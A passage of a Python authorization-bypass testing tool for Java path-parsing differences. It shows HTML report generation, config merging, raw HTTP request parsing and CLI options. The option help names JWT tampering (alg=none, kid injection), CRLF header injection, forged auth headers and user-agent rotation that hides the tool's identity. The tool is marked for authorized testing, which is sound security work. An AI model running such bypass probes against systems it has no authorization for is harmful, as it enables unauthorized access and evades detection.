    """生成自包含 HTML 报告——摘要卡片 + 命中表 + diff 视图 + 覆盖率图
    v3.2: 新增框架指纹 / HTTP 方法矩阵 / 重定向链分析三个板块"""
    extra = extra or {}
    ts = time.strftime("%Y-%m-%d %H:%M:%S")

    # 覆盖率统计
    cat_counts = {}
    cat_hits = {}
    for row in rows:
        cat = row["variant"]["cat"]
        cat_counts[cat] = cat_counts.get(cat, 0) + 1
        if row["verdict"] == "★疑似绕过":
            cat_hits[cat] = cat_hits.get(cat, 0) + 1

    # 置信度分布
    conf_dist = {"高": 0, "中": 0, "低": 0}
    for h in hits:
        conf = h.get("confidence", "中")
        conf_dist[conf] = conf_dist.get(conf, 0) + 1

    # 生成 diff 视图（最多 5 个命中项；v3.1：单边限 MAX_DIFF_CHARS 防止大卡）
    diff_sections = []
    for i, hit in enumerate(hits[:5]):
        v = hit["variant"]
        r = hit["resp"]
        baseline_body = (base_low.get("body") or "")[:MAX_DIFF_CHARS]
        resp_body = (r["body"] or "")[:MAX_DIFF_CHARS]
        try:
            diff_html = difflib.HtmlDiff().make_table(
                baseline_body.splitlines(keepends=True),
                resp_body.splitlines(keepends=True),
                fromdesc="低权限基线", todesc="变形响应",
                context=True, numlines=5
            )
        except Exception:
            diff_html = "<p>(diff 生成失败)</p>"
        diff_sections.append(f"""
        <div class="diff-view">
            <h3>[{esc(v['cat'])}] {esc(v['desc'])}</h3>
            <p class="diff-meta">HTTP {r['code']} | len={r['length']} | 置信度={esc(hit.get('confidence', '-'))}</p>
            {diff_html}
        </div>""")

    # 命中表行（v3.1：URL 截断显示 + title 悬浮全文，可右键复制完整 URL）
    hit_rows_html = ""
    for h in hits:
        s = slim(h)
        conf_class = {"高": "badge-high", "中": "badge-mid", "低": "badge-low"}.get(s["置信度"], "badge-low")
        same_root = ""
        if s.get("同根因变形"):
            same_root = f"<br><small class='muted'>同根因: {esc(', '.join(s['同根因变形'][:3]))}</small>"
        url_disp = esc(s["URL"][:80]) + ("…" if len(s["URL"]) > 80 else "")
        trunc_mark = " <span class='badge badge-low'>截断</span>" if s.get("截断") else ""
        hit_rows_html += f"""
            <tr>
                <td>{esc(s['类别'])}</td>
                <td>{esc(s['手法'])}</td>
                <td>{esc(s['方法'])}</td>
                <td>{s['状态码']}</td>
                <td>{s['长度']}{trunc_mark}</td>
                <td><span class="badge {conf_class}">{esc(s['置信度'])}</span></td>
                <td>{esc(s['备注'])}{same_root}</td>
                <td><small class="muted" title="{esc(s['URL'])}">{url_disp}</small></td>
            </tr>"""

    # 覆盖率柱状图
    max_count = max(cat_counts.values()) if cat_counts else 1
    coverage_bars = ""
    for cat in sorted(cat_counts.keys()):
        count = cat_counts[cat]
        hits_count = cat_hits.get(cat, 0)
        width = int(count / max_count * 100)
        hit_width = int(hits_count / max_count * 100) if hits_count else 0
        coverage_bars += f"""
            <div class="bar-row">
                <span class="bar-label">{esc(cat)}</span>
                <div class="bar-track">
                    <div class="bar bar-total" style="width: {width}%">{count}</div>
                    <div class="bar bar-hit" style="width: {hit_width}%">{hits_count if hits_count else ''}</div>
                </div>
            </div>"""

    # 聚类信息
    cluster_html = ""
    if clusters and len(clusters) < len(hits):
        cluster_html = "<div class='card'><h3>命中归因聚类</h3><table><tr><th>根因</th><th>同根因变形数</th><th>同根因变形</th></tr>"
        for cl in clusters:
            if cl["count"] > 1:
                cluster_html += f"<tr><td>{esc(cl['representative']['variant']['desc'])}</td><td>{cl['count']}</td><td><small>{esc(', '.join(cl['same_root'][:5]))}</small></td></tr>"
        cluster_html += "</table></div>"

    # v3.2: 框架指纹板块（智能模式依据）
    fp_html = ""
    if extra.get("fingerprint"):
        fp_rows = "".join(
            f"<tr><td>{esc(fw['名称'])}</td><td>{esc(fw['证据'])}</td>"
            f"<td>{esc(', '.join(fw['推荐类别']))}</td>"
            f"<td><small class='muted'>{esc(fw.get('说明', ''))}</small></td></tr>"
            for fw in extra["fingerprint"])
        fp_html = ("<div class='card'><h3>框架指纹与环境识别（智能模式依据）</h3>"
                   "<table><tr><th>组件</th><th>证据</th><th>推荐类别</th><th>差异说明</th></tr>"
                   + fp_rows + "</table></div>")

    # v3.2: HTTP 方法矩阵板块
    mm_html = ""
    matrix = extra.get("method_matrix") or []
    if matrix:
        mm_rows = "".join(
            f"<tr><td>{esc(m['方法'])}</td><td>{m['状态码']}</td>"
            f"<td>{esc(m['判定'])}</td><td><small class='muted'>{esc(m['备注'] or '')}</small></td></tr>"
            for m in matrix)
        n2xx = sum(1 for m in matrix if m["状态码"] in OK_CODES)
        warn = (f"<p class='meta-line' style='color:#e8463a;'>"
                f"⚠ {n2xx} 个方法变形在 GET 基线被拒时返回 2xx——方法级鉴权不一致疑点</p>") if n2xx else ""
        mm_html = (f"<h2>HTTP 方法矩阵（方法级鉴权一致性）</h2>{warn}"
                   "<table><tr><th>方法/变形</th><th>状态码</th><th>判定</th><th>备注</th></tr>"
                   + mm_rows + "</table>")

    # v3.2: 重定向链分析板块
    rd_html = ""
    for a in extra.get("redirect_analysis") or []:
        hops_disp = "<br>".join(
            f"{esc(str(h['码']))} → {esc((h['Location'] or h['URL'])[:90])}"
            for h in a["链"])
        rd_html += (f"<tr><td>{esc(a['类别'])}<br><small class='muted'>{esc(a['手法'])}</small></td>"
                    f"<td><small>{hops_disp}</small></td>"
                    f"<td>{a['落点']['状态码']}</td><td><small>{esc(a['落点']['落点路径'])}</small></td>"
                    f"<td>{esc(a['判定'] or '-')}</td><td><small>{esc(a['备注'] or '')}</small></td></tr>")
    if rd_html:
        rd_html = ("<h2>重定向链分析（多级跳转追踪 + 落点对比）</h2>"
                   "<table><tr><th>变形</th><th>跳转链</th><th>落点码</th><th>落点路径</th><th>判定</th><th>备注</th></tr>"
                   + rd_html + "</table>")

    html_content = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>权限绕过测试报告 - {esc(target)}</title>
<style>
body {{ font-family: -apple-system, "PingFang SC", "Noto Sans CJK SC", system-ui, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; color: #333; }}
.container {{ max-width: 1200px; margin: 0 auto; }}
h1 {{ color: #1a1a2e; border-bottom: 3px solid #4B3FE3; padding-bottom: 10px; font-size: 22px; }}
h2 {{ color: #1a1a2e; margin-top: 30px; font-size: 18px; }}
.summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin: 20px 0; }}
.card {{ background: #fff; border-radius: 8px; padding: 15px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }}
.card h3 {{ margin: 0 0 8px 0; font-size: 12px; color: #888; text-transform: uppercase; letter-spacing: 0.5px; }}
.card .value {{ font-size: 24px; font-weight: 600; color: #1a1a2e; }}
.card.hit .value {{ color: #e8463a; }}
.card.review .value {{ color: #efaa17; }}
.card.cluster .value {{ color: #4B3FE3; }}
table {{ width: 100%; border-collapse: collapse; margin: 15px 0; background: #fff; border-radius: 8px; overflow: hidden; }}
th, td {{ padding: 8px 12px; text-align: left; border-bottom: 1px solid #eee; font-size: 13px; }}
th {{ background: #f8f8f8; font-weight: 600; color: #555; }}
tr:hover {{ background: #f5f5ff; }}
.diff-view {{ margin: 20px 0; background: #fff; border-radius: 8px; padding: 15px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }}
.diff-view h3 {{ color: #4B3FE3; margin: 0 0 5px 0; font-size: 15px; }}
.diff-meta {{ color: #888; font-size: 12px; margin: 0 0 10px 0; }}
.diff-view table {{ font-size: 12px; font-family: monospace; }}
.diff_view table td {{ white-space: pre-wrap; word-break: break-all; }}
.bar-chart {{ margin: 15px 0; }}
.bar-row {{ display: flex; align-items: center; margin: 4px 0; }}
.bar-label {{ width: 100px; font-size: 12px; color: #666; flex-shrink: 0; }}
.bar-track {{ flex: 1; height: 22px; background: #eee; border-radius: 4px; position: relative; overflow: hidden; }}
.bar {{ height: 100%; border-radius: 4px; display: flex; align-items: center; padding-left: 8px; color: #fff; font-size: 11px; position: absolute; left: 0; top: 0; }}
.bar-total {{ background: #4B3FE3; z-index: 1; }}
.bar-hit {{ background: #e8463a; z-index: 2; opacity: 0.85; }}
.badge {{ display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 11px; font-weight: 600; }}
.badge-high {{ background: #fee; color: #c00; }}
.badge-mid {{ background: #fff3e0; color: #e65100; }}
.badge-low {{ background: #e8f5e9; color: #2e7d32; }}
.muted {{ color: #999; }}
.meta-line {{ color: #666; font-size: 13px; margin: 3px 0; }}
</style>
</head>
<body>
<div class="container">
<h1>权限绕过测试报告 v{VERSION}</h1>
<p class="meta-line">目标: <strong>{esc(target)}</strong></p>
<p class="meta-line">时间: {ts} | 工具版本: v{VERSION}</p>
<p class="meta-line">低权限基线: HTTP {base_low['code']} (len={base_low['length']}) Location: {esc(base_low['location'] or '-')}
{f'| 高权限基线: HTTP {base_high["code"]} (len={base_high["length"]})' if base_high else ''}
{f'| 错误页基线: HTTP {base_err["code"]} (len={base_err["length"]})' if base_err else ''}</p>

<div class="summary">
    <div class="card"><h3>变形总数</h3><div class="value">{len(rows)}</div></div>
    <div class="card hit"><h3>★ 疑似绕过</h3><div class="value">{len(hits)}</div></div>
    <div class="card review"><h3>△ 需复核</h3><div class="value">{len(reviews)}</div></div>
    <div class="card cluster"><h3>聚类根因</h3><div class="value">{len(clusters)}</div></div>
</div>

<div class="summary">
    <div class="card"><h3>高置信度</h3><div class="value">{conf_dist['高']}</div></div>
    <div class="card"><h3>中置信度</h3><div class="value">{conf_dist['中']}</div></div>
    <div class="card"><h3>低置信度</h3><div class="value">{conf_dist['低']}</div></div>
</div>

{cluster_html}

{fp_html}

<h2>变形覆盖率（按类别）</h2>
<div class="bar-chart">
    <div class="bar-row"><span class="bar-label"></span><span style="font-size:11px;color:#4B3FE3;">■ 总数</span> &nbsp; <span style="font-size:11px;color:#e8463a;">■ 命中</span></div>
    {coverage_bars}
</div>

{mm_html}

{rd_html}

<h2>★ 疑似绕过详情</h2>
<table>
<tr><th>类别</th><th>手法</th><th>方法</th><th>状态码</th><th>长度</th><th>置信度</th><th>备注</th><th>URL</th></tr>
{hit_rows_html if hit_rows_html else '<tr><td colspan="8" style="text-align:center;color:#999;">无命中项</td></tr>'}
</table>

<h2>响应体差异对比（Diff 视图）</h2>
{''.join(diff_sections) if diff_sections else '<p style="color:#999;">无命中项，无可对比的 diff 视图。</p>'}

</div>
</body>
</html>"""

    with open(base_name + ".html", "w", encoding="utf-8") as f:
        f.write(html_content)


# ---------------------------------------------------------------------------
# 13. YAML 配置文件支持
# ---------------------------------------------------------------------------
def load_yaml_config(path):
    """加载 YAML 配置文件"""
    if yaml is None:
        print(c_bad("[-] PyYAML 未安装，请执行: pip install pyyaml"))
        return {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            return yaml.safe_load(f) or {}
    except OSError as e:
        print(c_bad(f"[-] 读取配置文件失败: {e}"))
        return {}


def merge_config(args, cfg):
    """合并 YAML 配置与 CLI 参数（CLI 优先级更高）。
    v3.1 修复：改用 None 哨兵判断"用户未显式传参"，用户显式传默认值也能覆盖 YAML。"""
    # 目标
    if not args.url and not args.file:
        targets = cfg.get("targets", [])
        if isinstance(targets, list):
            args.url = targets
        elif isinstance(targets, str):
            args.url = [targets]

    # Cookies
    if not args.low_cookie:
        args.low_cookie = cfg.get("cookies", {}).get("low", "")
    if not args.high_cookie:
        args.high_cookie = cfg.get("cookies", {}).get("high", "")

    # 自定义头
    if not args.header and cfg.get("headers"):
        args.header = [f"{k}: {v}" for k, v in cfg["headers"].items()]

    # 阈值（None = 用户未传）
    if args.threshold is None:
        args.threshold = cfg.get("thresholds", {}).get("content_similarity")

    # 限速
    rl = cfg.get("rate_limit", {})
    if args.delay is None:
        args.delay = rl.get("delay")
    if args.jitter is None:
        args.jitter = rl.get("jitter")
    if args.threads is None:
        args.threads = rl.get("threads")
    if args.abort_after is None:
        args.abort_after = rl.get("abort_after")

    # 变形筛选
    deform = cfg.get("deformations", {})
    if not args.categories:
        cats = deform.get("categories")
        if cats:
            args.categories = ",".join(cats) if isinstance(cats, list) else cats
    if not args.exclude:
        ex = deform.get("exclude", [])
        args.exclude_variants = list(ex) if ex else []
    if args.max_variants is None:
        args.max_variants = deform.get("max_variants")

    # 代理
    if not args.proxy:
        args.proxy = cfg.get("proxy", "")

    # v3.2: 智能模式 / 指纹模式 / 重定向追踪
    if not getattr(args, "smart", False):
        args.smart = bool(cfg.get("smart", False))
    if not getattr(args, "fingerprint_only", False):
        args.fingerprint_only = bool(cfg.get("fingerprint_only", False))
    if getattr(args, "max_redirect_trace", None) is None:
        args.max_redirect_trace = cfg.get("redirect", {}).get("max_trace")

    # v3.4: 认证构造 / 组合引擎 / 基线健康检查 / 输出选项
    if not getattr(args, "probe_auth", False):
        args.probe_auth = bool(cfg.get("probe_auth", False))
    # v4.3: JWT 篡改 / UA 伪装
    if not getattr(args, "probe_jwt", False):
        args.probe_jwt = bool(cfg.get("probe_jwt", False))
    if not getattr(args, "user_agent", ""):
        args.user_agent = str(cfg.get("user_agent", "") or "")
    if not getattr(args, "combine", False):
        args.combine = bool(cfg.get("combine", False))
    if getattr(args, "combine_cap", None) is None:
        args.combine_cap = cfg.get("deformations", {}).get("combine_cap")
    if getattr(args, "baseline_check", None) is None:
        args.baseline_check = cfg.get("baseline_check")
    if not getattr(args, "jsonl", False):
        args.jsonl = bool(cfg.get("jsonl", False))
    if not getattr(args, "redact_evidence", False):
        args.redact_evidence = bool(cfg.get("redact_evidence", False))
    # v3.5: 指定前缀借道 / 借道×方法副本
    if not getattr(args, "borrow_prefix", None):
        bp = deform.get("borrow_prefix", [])
        if bp:
            args.borrow_prefix = list(bp) if isinstance(bp, list) else [str(bp)]
    if not getattr(args, "prefix_methods", False):
        args.prefix_methods = bool(deform.get("prefix_methods", False))

    # v3.8: 请求文件 / 基础方法 / 请求体 / 协议补全
    if not getattr(args, "request_file", None):
        rf = cfg.get("request_files", [])
        if rf:
            args.request_file = list(rf) if isinstance(rf, list) else [str(rf)]
    if not getattr(args, "method", None):
        args.method = cfg.get("method")
    if getattr(args, "data", None) is None:
        args.data = cfg.get("data")
    if getattr(args, "scheme", "http") == "http" and cfg.get("scheme"):
        args.scheme = cfg.get("scheme")

    return args


def apply_defaults(args):
    """v3.1: YAML 合并后统一回填默认值（None 哨兵模式的配套步骤）"""
    if args.threshold is None:
        args.threshold = 0.90
    if args.delay is None:
        args.delay = 0.2
    if args.jitter is None:
        args.jitter = 0.3
    if args.threads is None:
        args.threads = 1
    if args.abort_after is None:
        args.abort_after = 8
    if getattr(args, "max_redirect_trace", None) is None:
        args.max_redirect_trace = 8
    # v3.4 新增参数默认值
    if getattr(args, "combine_cap", None) is None:
        args.combine_cap = 250
    if getattr(args, "baseline_check", None) is None:
        args.baseline_check = 50
    return args


# ---------------------------------------------------------------------------
# 14. 参数解析与入口
# ---------------------------------------------------------------------------
def parse_headers(items):
    """--header 'Key: Value' 列表 -> dict"""
    h = {}
    for it in items or []:
        if ":" in it:
            k, v = it.split(":", 1)
            h[k.strip()] = v.strip()
        else:
            print(c_rev(f"[!] 忽略无法解析的 header: {it!r}（应为 'Key: Value'）"))
    return h


def read_cookie_file(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read().strip()
    except OSError as e:
        print(c_rev(f"[!] 读取 Cookie 文件失败 {path}: {e}"))
        return ""


# v3.8: 请求文件中剥离的逐跳/长度管理头——由 aiohttp 自行管理，
# 文件里的旧值（尤其 Content-Length 与实际体不匹配时）会导致请求被截断或挂起
REQUEST_FILE_STRIP_HEADERS = ("host", "content-length", "transfer-encoding", "connection",
                              "keep-alive", "accept-encoding", "te",
                              "upgrade-insecure-requests", "content-encoding", "cookie")


class TargetSpec:
    """v3.8: 测试目标模型 = URL + 基础方法/请求体/附加头/低权限 Cookie。
    -r 请求文件、--url+--method/--data、批量文件三种输入统一收敛到该模型；
    仅 URL 输入时退化为 GET 语义（v3.7 及之前的行为完全不变）。"""

    def __init__(self, url, method="GET", body="", headers=None, cookie=""):
        self.url = url
        self.method = (method or "GET").upper()
        self.body = body or ""
        self.headers = dict(headers or {})
        self.cookie = cookie or ""


def parse_raw_request(path, default_scheme="http"):
    """v3.8: 解析 sqlmap -r 风格的原始 HTTP 请求文件 → TargetSpec。
    - 请求行支持 origin-form（/path + Host 头）与 absolute-form（http://host/path）
    - Cookie 头 → 低权限凭据；其余头原样保留（Authorization/Bearer 天然支持）
    - Host/Content-Length/Accept-Encoding 等逐跳与长度管理头剥离（aiohttp 自管）
    - Host 带 :443/:80 端口时自动推断协议，否则用 default_scheme"""
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        raw = f.read().replace("\r\n", "\n").lstrip("\n")

    head, sep, body = raw.partition("\n\n")  # 首个空行分隔头与体（体内空行不受影响）
    if not sep:
        head, body = raw, ""
    lines = [ln for ln in head.split("\n") if ln.strip()]
    if not lines:
        raise ValueError("空请求文件")
    m = re.match(r"^([A-Za-z]+)\s+(\S+)(?:\s+HTTP/[\d.]+)?\s*$", lines[0].strip())
    if not m:
        raise ValueError(f"请求行无法解析: {lines[0]!r}（应为 'METHOD /path HTTP/1.1'）")
    method, target = m.group(1).upper(), m.group(2)

    pairs = []
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            pairs.append((k.strip(), v.strip()))
    lower = {k.lower(): v for k, v in pairs}

    if "chunked" in lower.get("transfer-encoding", "").lower():
        raise ValueError("不支持 Transfer-Encoding: chunked，请另存为解码后的明文请求（Burp 选 raw）")
    if lower.get("content-encoding"):
        raise ValueError(f"不支持压缩请求体({lower['content-encoding']})，请提供解压后的明文")

    cookie = "; ".join(v for k, v in pairs if k.lower() == "cookie")
    headers = {k: v for k, v in pairs if k.lower() not in REQUEST_FILE_STRIP_HEADERS}

    if target.lower().startswith(("http://", "https://")):
        url = target  # absolute-form 请求行
    else:
        host = lower.get("host", "")
        if not host:
            raise ValueError("origin-form 请求行缺少 Host 头（或改用 absolute-form 请求行）")
        if ":443" in host:
            scheme = "https"
        elif ":80" in host:
            scheme = "http"
        else:
            scheme = default_scheme or "http"
        url = f"{scheme}://{host}{target}"

    return TargetSpec(url=url, method=method, body=body, headers=headers, cookie=cookie)


def parse_args():
    p = argparse.ArgumentParser(
        description="Java 权限绕过（路径解析差异）URL 变形测试器 v" + VERSION,
        epilog="退出码: 有 ★ 命中=1, 无命中=0。⚠️ 仅限对已获书面授权的目标使用！")
    p.add_argument("--url", action="append", help="目标 URL，可多次指定")
    p.add_argument("--file", help="批量目标文件，每行一个 URL")
    p.add_argument("-r", "--request-file", dest="request_file", action="append",
                   help="v3.8: sqlmap -r 风格——从文件读取完整原始 HTTP 请求（支持 POST/PUT 等方法、"
                        "请求体与自定义头；文件中的 Cookie 头作为低权限凭据，Authorization 等认证头"
                        "原样保留；可多次指定测试多个请求）")
    p.add_argument("--scheme", default="http",
                   help="v3.8: -r 模式下 origin-form 请求行的协议补全（默认 http；"
                        "Host 头带 :443 端口时自动识别 https）")
    p.add_argument("--method", default=None,
                   help="v3.8: 配合 --url 指定基础请求方法（默认 GET；-r 文件模式取请求行中的方法）")
    p.add_argument("--data", default=None,
                   help="v3.8: 配合 --url 指定基础请求体（@file 前缀从文件读取；"
                        "-r 文件模式取文件中的请求体）")
    p.add_argument("--config", help="YAML 配置文件路径（CLI 参数优先级更高）")
    p.add_argument("--low-cookie", default="", help="低权限/未登录 Cookie")
    p.add_argument("--high-cookie", default="", help="高权限 Cookie（可选，精确对比用）")
    p.add_argument("--low-cookie-file", default="", help="从文件读取低权限 Cookie（避免 shell 历史泄漏）")
    p.add_argument("--high-cookie-file", default="", help="从文件读取高权限 Cookie")
    p.add_argument("--header", action="append", help="自定义请求头 'Key: Value'，可多次指定")
    p.add_argument("--delay", type=float, default=None, help="全局请求间隔秒数（默认 0.2）")
    p.add_argument("--jitter", type=float, default=None, help="间隔随机抖动比例 0~1（默认 0.3，0 关闭）")
    p.add_argument("--threads", type=int, default=None, help="并发数（默认 1，建议 <=10）")
    p.add_argument("--proxy", default="", help="HTTP 代理，如 http://127.0.0.1:8080")
    p.add_argument("--timeout", type=int, default=10, help="单请求超时秒数（默认 10）")
    p.add_argument("--threshold", type=float, default=None, help="与基线的内容相似度阈值（默认 0.90）")
    p.add_argument("--abort-after", type=int, default=None, help="连续 N 次请求失败后熔断（默认 8，0 关闭）")
    p.add_argument("--out", default="bypass_report", help="报告文件名前缀（默认 bypass_report）")
    # v3.1 [D3 修复] --verify → --tls-verify；--no-verify → --skip-recheck（旧名兼容）
    p.add_argument("--tls-verify", dest="tls_verify", action="store_true",
                   help="开启 TLS 证书校验（默认关闭）")
    p.add_argument("--verify", dest="tls_verify", action="store_true",
                   help=argparse.SUPPRESS)  # 旧别名，兼容用
    p.add_argument("--skip-recheck", dest="skip_recheck", action="store_true",
                   help="跳过 ★ 命中项的二次复核")
    p.add_argument("--no-verify", dest="skip_recheck", action="store_true",
                   help=argparse.SUPPRESS)  # 旧别名，兼容用
    p.add_argument("--no-evidence", action="store_true", help="不保存 ★ 命中项的响应证据")
    p.add_argument("--categories", default=None,
                   help="只测试指定类别（逗号分隔，如 A,B,C 或 分号参数,..;/ 穿越；v3.2 新增 Q路径规范化/R编码解码/S尾缀差异/T重定向差异/U请求头重写；"
                        "v3.4 新增 V(Unicode规范化)/W(认证构造,需--probe-auth或显式点名)/X(组合变形,需--combine)/Y(Host改写)/Z(绝对URI)；"
                        "v3.5 新增 AA(段变异)；"
                        "v3.6 新增 AB(段大小写，/API/v1/devices 型大小写路由绕过)；"
                        "v3.7 新增 AC(分号后缀，;.js/;1.js/;a.js/%%3b.js 等分号×静态后缀全矩阵，"
                        "静态后缀池扩充至 38 个)；"
                        "v4.1 新增 AD(CRLF头注入，%%0d%%0a头注入/Unicode全宽/overlong变体)/"
                        "AE(查询污染，?/?debug=1/?WSDL 等查询串差异)；"
                        "v4.2 新增 AF(百分号编码矩阵)/AG(反斜杠解析)/AH(点段规范化矩阵)/"
                        "AI(重复斜杠与路径压缩)/AJ(路径查询边界)/AK(路径截断与后缀解析)；"
                        "v4.3 新增 AL(协议切换，HTTP↔HTTPS 翻转×高价值路径变形)/"
                        "AM(JWT篡改，alg=none/签名剥离/claim提升/kid注入，"
                        "需--probe-jwt或显式点名，且基础请求须携带 Bearer JWT)）")
    p.add_argument("--exclude", default=None,
                   help="排除包含指定关键字的变形（逗号分隔）")
    # v3.1 新增：干跑模式与变形上限
    p.add_argument("--list-variants", dest="list_variants", action="store_true",
                   help="干跑模式：只列出将生成的变形，不发送任何请求")
    p.add_argument("--max-variants", dest="max_variants", type=int, default=None,
                   help="每个目标最多测试的变形数（默认不限）")
    # v3.2 新增：框架指纹智能模式 / 指纹单跑 / 重定向链追踪
    p.add_argument("--smart", action="store_true",
                   help="智能模式：先做框架指纹，按框架推荐类别自动筛选变形，减少噪声"
                        "（--categories 显式指定时不生效；无指纹命中时回退全类别）")
    p.add_argument("--fingerprint-only", dest="fingerprint_only", action="store_true",
                   help="仅做框架指纹识别与类别推荐，输出后退出（不发变形请求）")
    p.add_argument("--max-redirect-trace", dest="max_redirect_trace", type=int, default=None,
                   help="重定向链追踪样本上限（默认 8，0 关闭）")
    # v3.4 新增：覆盖增强与工程化选项
    p.add_argument("--probe-auth", dest="probe_auth", action="store_true",
                   help="启用认证构造类变形（Authorization 变体与内部信任头，默认关闭，仅限授权测试）")
    # v4.3 新增：JWT 篡改插件门控
    p.add_argument("--probe-jwt", dest="probe_jwt", action="store_true",
                   help="v4.3: 启用 JWT 篡改类变形（alg=none/签名剥离/claim 提升/kid 注入，"
                        "默认关闭，仅限授权测试；需 -r 请求文件或 --header 提供 Bearer JWT）")
    # v4.3 新增：UA 伪装
    p.add_argument("--user-agent", dest="user_agent", default="",
                   help="v4.3: 固定 User-Agent（默认从内置浏览器 UA 池逐请求随机轮换，"
                        "不再发送 authz-bypass-tester 自标识 UA；--header 指定的 UA 优先级更高）")
    p.add_argument("--combine", action="store_true",
                   help="启用双因子组合变形引擎（高价值类别前缀×后缀组合，默认关闭）")
    p.add_argument("--combine-cap", dest="combine_cap", type=int, default=None,
                   help="组合变形数量上限（默认 250）")
    p.add_argument("--baseline-check", dest="baseline_check", type=int, default=None,
                   help="每 N 个变形静默复查基线，状态漂移（疑似会话过期）即熔断（默认 50，0 关闭）")
    p.add_argument("--jsonl", action="store_true",
                   help="额外输出 JSONL 逐行判定结果（全量变形，CI/SIEM 集成用）")
    p.add_argument("--redact-evidence", dest="redact_evidence", action="store_true",
                   help="证据文件中的手机号/身份证/邮箱/银行卡脱敏后落盘")
    # v3.5 新增：指定前缀借道 / 借道×方法副本
    p.add_argument("--borrow-prefix", dest="borrow_prefix", action="append",
                   help="指定真实公开/白名单前缀（可多次指定，如 --borrow-prefix /api/public），"
                        "生成 前缀/../原路径 根级前置与 前缀/../剩余段 段内还原两种借道变形，"
                        "覆盖网关公开规则挂在子路径（/api/public/**）的场景")
    p.add_argument("--prefix-methods", dest="prefix_methods", action="store_true",
                   help="为借道/穿越类 GET 变形追加 POST/PUT/PATCH 方法副本，探测写接口借道绕过"
                        "（DELETE 有破坏性默认不复制，如需可改 PREFIX_METHOD_LIST）")
    # v3.9 新增：输出着色开关
    p.add_argument("--no-color", dest="no_color", action="store_true",
                   help="关闭终端彩色输出（输出重定向到文件或设置 NO_COLOR 环境变量时也会自动关闭）")
    return p.parse_args()


def collect_targets(args):
    """v3.8: 三种输入统一收敛为 TargetSpec 列表——
    -r 请求文件（sqlmap 风格） / --url+--method+--data / --file 批量 URL。
    CLI --header 统一并入 TargetSpec.headers（覆盖文件头，与 sqlmap 语义一致），
    供 I 类方法插件感知 Content-Type 选择 _method 注入方式"""
    cli_headers = parse_headers(getattr(args, "header", None))
    specs = []
    for req in getattr(args, "request_file", None) or []:
        try:
            spec = parse_raw_request(req, getattr(args, "scheme", None) or "http")
            if cli_headers:
                spec.headers = {**spec.headers, **cli_headers}
            specs.append(spec)
        except (OSError, ValueError) as e:
            print(c_bad(f"[-] 解析请求文件失败 {req}: {e}"))
    for u in args.url or []:
        body = args.data or ""
        if body.startswith("@"):
            try:
                with open(body[1:], "r", encoding="utf-8", errors="replace") as f:
                    body = f.read()
            except OSError as e:
                print(c_bad(f"[-] 读取 --data 文件失败: {e}"))
                body = ""
        specs.append(TargetSpec(u, getattr(args, "method", None) or "GET", body,
                                headers=dict(cli_headers)))
    if args.file:
        with open(args.file, "r", encoding="utf-8") as f:
            specs += [TargetSpec(ln.strip(), headers=dict(cli_headers)) for ln in f
                      if ln.strip() and not ln.startswith("#")]
    if specs:
        return specs

    # 交互模式兜底
    t = input("请输入标准受保护 URL（如 https://host/app/admin/user/list）: ").strip()
    if not t:
        return []
    args.low_cookie = args.low_cookie or input("低权限/未登录 Cookie（可留空）: ").strip()
    args.high_cookie = args.high_cookie or input("高权限 Cookie（可留空）: ").strip()
    return [TargetSpec(t, headers=dict(cli_headers))]


def cmd_list_variants(args, targets):
    """v3.1: 干跑模式——列出变形清单后退出，不发起任何网络请求
    v3.8: targets 为 TargetSpec 列表，干跑同样按基础方法/请求体/请求头生成变形"""
    for spec in targets:
        variants = generate_variants(spec.url, args.categories, args.exclude_variants,
                                     probe_auth=bool(getattr(args, "probe_auth", False)),
                                     probe_jwt=bool(getattr(args, "probe_jwt", False)),
                                     combine=bool(getattr(args, "combine", False)),
                                     combine_cap=getattr(args, "combine_cap", 250) or 250,
                                     borrow_prefixes=getattr(args, "borrow_prefix", None),
                                     prefix_methods=bool(getattr(args, "prefix_methods", False)),
                                     base_method=spec.method, base_body=spec.body or None,
                                     base_headers=spec.headers)
        total = len(variants)
        if args.max_variants:
            variants = round_robin_slice(variants, args.max_variants)
        print(c_head(f"\n目标: {spec.url}"))
        print(c_info(f"基础请求: {spec.method}"
                     + (f" | 请求体 {len(spec.body)}B" if spec.body else "")
                     + (f" | 附加头: {', '.join(spec.headers)}" if spec.headers else "")
                     + (f" | Cookie: {'(文件提供)' if spec.cookie else '(无)'}")))
        print(c_info(f"将生成 {total} 个变形"
                     + (f"，--max-variants 截取前 {len(variants)} 个" if len(variants) < total else "")))
        print(c_dim("-" * 106))
        print(c_head(pad("#", 6) + pad("类别", 16) + pad("方法", 8) + "描述 / URL"))
        for i, v in enumerate(variants, 1):
            print(pad(str(i), 6) + pad(v["cat"], 16) + pad(v["method"], 8)
                  + f"{v['desc']}  ->  {v['url'][:90]}")
    print(c_ok(f"\n[*] 干跑完成，未发送任何请求。去掉 --list-variants 即开始实际测试。"))


async def async_main(args, targets):
    print(c_head("=" * 78))
    print(c_head(f" Java 权限绕过 · 路径解析差异 URL 变形测试器 v{VERSION}"))
    print(c_dim(" v3.2 新增：路径规范化/编码解码/尾缀/重定向差异/请求头重写类别 + 框架指纹智能筛选"))
    print(c_dim(" v3.3 增强：21 个变形插件 payload 全面扩充（矩阵参数/编码组合/方法覆盖/来源伪造/平台特性）"))
    print(c_dim(" v3.4 升级：yarl重编码修复(encoded URL) + Unicode/认证构造/Host改写/绝对URI/组合变形 5 类新插件"))
    print(c_dim("           + 敏感字段实锤/状态迁移信号/基线健康检查/JSONL输出/证据脱敏/轮转截断"))
    print(c_dim(" v3.5 补丁：AA段变异(中段编码/中边界斜杠) + --borrow-prefix 指定前缀借道 + --prefix-methods 借道×方法副本"))
    print(c_dim("           + 网关指纹(Kong/APISIX/Traefik)——补齐中段/子路径规则/写接口借道盲区"))
    print(c_dim(" v3.6 补丁：AB段大小写——逐段大写/小写/首字母/交换/交替 + 跨段组合 + 扩展名大小写"))
    print(c_dim("           覆盖 /API/v1/devices 型两层大小写敏感度不一致的路由绕过"))
